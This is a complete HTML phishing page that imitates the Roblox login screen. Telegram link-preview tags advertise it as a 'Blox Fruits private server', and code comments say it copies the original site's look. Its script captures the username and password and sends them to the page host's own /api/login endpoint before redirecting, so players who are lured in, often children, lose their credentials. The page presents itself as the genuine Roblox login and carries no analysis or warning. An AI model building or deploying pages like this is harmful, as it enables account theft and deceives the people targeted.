<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>

    <!-- Telegram Preview Meta Tags -->
    <meta property="og:site_name" content="Roblox">
    <meta property="og:title" content="Blox Fruits — Private Server">
    <meta property="og:description" content="Secure access to the Blox Fruits private server. Click to enter the game.">
    <meta property="og:image" content="https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png">
    <meta property="og:image:secure_url" content="https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="420">
    <meta property="og:image:height" content="420">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        body {
            background-color: #f2f4f5;
            color: #111;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            padding: 20px 16px;
        }

        /* Фоновый паттерн / легкое затемнение под оригинальный сайт */
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.6)),
                        url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png');
            background-size: cover;
            background-position: center;
            z-index: -1;
        }

        /* Центральная белая карточка как на оригинальном сайте Roblox */
        .login-card {
            background: #ffffff;
            color: #111;
            width: 100%;
            max-width: 400px;
            padding: 32px 28px;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.25);
            text-align: center;
        }

        .login-title {
            font-size: 24px;
            font-weight: 700;
            color: #111;
            margin-bottom: 24px;
        }

        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }

        .input-label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #393b3d;
            margin-bottom: 6px;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
        }

        .input-wrapper input {
            width: 100%;
            padding: 12px 40px 12px 14px;
            background: #fff;
            border: 1px solid #757575;
            border-radius: 8px;
            font-size: 15px;
            color: #111;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-wrapper input:focus {
            border-color: #0074e8;
            box-shadow: 0 0 0 1px #0074e8;
        }

        .input-wrapper input::placeholder {
            color: #b2b2b2;
        }

        .eye-icon {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 18px;
            color: #757575;
            user-select: none;
        }

        /* Фирменная синяя кнопка входа Roblox */
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #0074e8;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 8px;
            margin-bottom: 16px;
            transition: background 0.2s;
        }

        .login-btn:hover {
            background: #005bb5;
        }

        .forgot-container {
            margin-top: 12px;
        }

        .forgot-link {
            color: #0074e8;
            font-size: 14px;
            text-decoration: none;
            font-weight: 600;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .divider {
            border: 0;
            height: 1px;
            background: #e0e0e0;
            margin: 20px 0;
        }

        .other-options-btn {
            width: 100%;
            padding: 12px;
            background: #f2f2f2;
            color: #393b3d;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .other-options-btn:hover {
            background: #e6e6e6;
        }

        #status {
            margin-top: 12px;
            font-size: 14px;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <h1 class="login-title">Login to Roblox</h1>

        <div class="input-group">
            <label class="input-label">Username/Email/Phone</label>
            <div class="input-wrapper">
                <input type="text" id="usernameInput" placeholder="Username/Email/Phone">
            </div>
        </div>

        <div class="input-group">
            <label class="input-label">Password</label>
            <div class="input-wrapper">
                <input type="password" id="passwordInput" placeholder="Password">
                <span class="eye-icon" id="eyeToggle" onclick="togglePassword()">👁️</span>
            </div>
        </div>

        <button class="login-btn" onclick="loginUser()">Log In</button>
        
        <div class="forgot-container">
            <a href="#" class="forgot-link">Forgot Password or Username?</a>
        </div>

        <hr class="divider">

        <button class="other-options-btn">Email Me a One-Time Code</button>
        <button class="other-options-btn">Quick Pass</button>

        <div id="status"></div>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('passwordInput');
            const eyeToggle = document.getElementById('eyeToggle');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeToggle.style.opacity = '1';
            } else {
                passwordInput.type = 'password';
                eyeToggle.style.opacity = '0.6';
            }
        }

        async function loginUser() {
            const username = document.getElementById('usernameInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const statusDiv = document.getElementById('status');

            if (!username || !password) {
                statusDiv.style.color = '#d9381e';
                statusDiv.innerText = 'Please fill in all fields.';
                return;
            }

            statusDiv.style.color = '#757575';
            statusDiv.innerText = 'Logging in...';

            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });

                const data = await response.json();

                if (response.ok) {
                    statusDiv.style.color = '#008000';
                    statusDiv.innerText = 'Success! Redirecting...';
                    
                    setTimeout(() => {
                        window.location.href = '/blox-fruits';
                    }, 1500);

                } else {
                    statusDiv.style.color = '#d9381e';
                    statusDiv.innerText = data.error || 'Login failed';
                }
            } catch (err) {
                statusDiv.style.color = '#d9381e';
                statusDiv.innerText = 'Connection error.';
            }
        }
    </script>
</body>
</html>
